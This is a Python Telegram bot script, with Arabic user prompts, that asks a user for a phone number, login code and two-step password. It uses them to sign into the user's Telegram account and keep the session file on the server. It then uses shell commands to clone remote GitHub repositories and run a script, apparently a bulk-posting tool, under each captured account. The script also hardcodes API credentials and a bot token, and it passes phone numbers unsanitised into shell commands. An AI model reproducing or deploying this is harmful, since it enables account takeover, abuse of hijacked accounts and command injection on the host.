from telethon import Button, errors
from telethon.sync import TelegramClient, events
import os , asyncio
api_id = 2192036
api_hash = '3b86a67fc4e14bd9dcfc2f593e75c841'
bot_token = '6622166945:AAGYoRMijhEgfaLcq1o8cRAcXUj3Fs6obRw'
bot = TelegramClient('bot73', api_id, api_hash).start(bot_token=bot_token)
async def Add_NUMBER(event ,phone_number):
    bos = f'/root/session/{phone_number}'
    iqthon = TelegramClient(bos, 2192036, '3b86a67fc4e14bd9dcfc2f593e75c841')
    await iqthon.connect()

    if not await iqthon.is_user_authorized():
        request = await iqthon.send_code_request(phone_number)

        async with bot.conversation(event.chat_id, timeout=300) as conv:
            # verification code
            await conv.send_message("__ارسل الكود الذي وصلك.. ضع علامة ( - ) بين كل رقم:__")
            response_verification_code = await conv.get_response()
            verification_code = str(response_verification_code.message).replace('-', '')

            try:
                login = await iqthon.sign_in(phone_number, code=int(verification_code))
            except errors.SessionPasswordNeededError:
                await conv.send_message("__الحساب محمي بكلمة السر, ارسل كلمة السر :__")
                password = await conv.get_response()

                await iqthon.sign_in(phone_number, password=password.text)
    await iqthon.disconnect()
    uu = open('sessions.txt', 'r')
    if phone_number in uu.read():
        os.popen(f'rm -r {phone_number}')
    else:
        uu.close()
        uui = open('sessions.txt', 'a')
        uui.write(phone_number + '\n')
    uu.close()
    return "تم اضافة الرقم بنجاح ✅"



@bot.on(events.CallbackQuery(data="UPdata"))
async def Callbacks(event):
    sessions = open('sessions.txt','r')
    for line in sessions:
        phone_number = line.replace('\n', '')
        uu = open('prift.txt', 'w')
        uu.write(phone_number)
        uu.close()
        #os.popen(f"screen -r {phone_number} bash -c 'rm -r {phone_number} && git clone https://github.com/sh3oo6/nshr_u.git && mv nshr_u {phone_number} && cd {phone_number} && python3 new_nshr_DEX.py; exec bash'")
        os.popen(f'''screen -S {phone_number} -X stuff "rm -r {phone_number} && git clone https://github.com/sh3oo6/nshr_u.git && mv nshr_u {phone_number} && cd {phone_number} && python3 new_nshr_DEX.py; exec bash"$(echo -ne '\\015')''')
    sessions.close()

@bot.on(events.CallbackQuery(data="People"))
async def Callbacsks(event):
    sessions = open('sessions.txt', 'r')
    await bot.send_message(sessions.read())
    sessions.close()

@bot.on(events.CallbackQuery(data="add_number"))
async def Callbacks(event):
    await event.delete()
    try:
        # get information from user
        async with bot.conversation(event.chat_id, timeout=300) as conv:
            await conv.send_message('Phone number ?')
            phone_number_msg = await conv.get_response()
            phone_number_msg = phone_number_msg.text
            phone_number = phone_number_msg.replace('+', '').replace(' ', '')
            open('prift.txt', 'w').write(phone_number)
            await conv.send_message(f'''ثواني''')
        result = await Add_NUMBER(event,phone_number)
        await asyncio.sleep(5)
        await event.reply(result)
        os.popen(f"screen -dmS {phone_number} bash -c ' git clone https://github.com/sh3oo6/dex.git && mv dex {phone_number} && cd {phone_number} && python3 new_nshr_DEX.py; exec bash'")
    except :pass
async def StartButtons(event, role):
    if role == 1:
        buttons = [[Button.inline("➕", "add_number")],[Button.inline("all", "People")]]
    await event.reply("›:ُِ 𝗗َِ𝗘َِ𝗫.#¹ :)", buttons=buttons)

@bot.on(events.NewMessage(pattern='/start'))
async def BotOnStart(event):
    await StartButtons(event,1)
bot.run_until_disconnected()
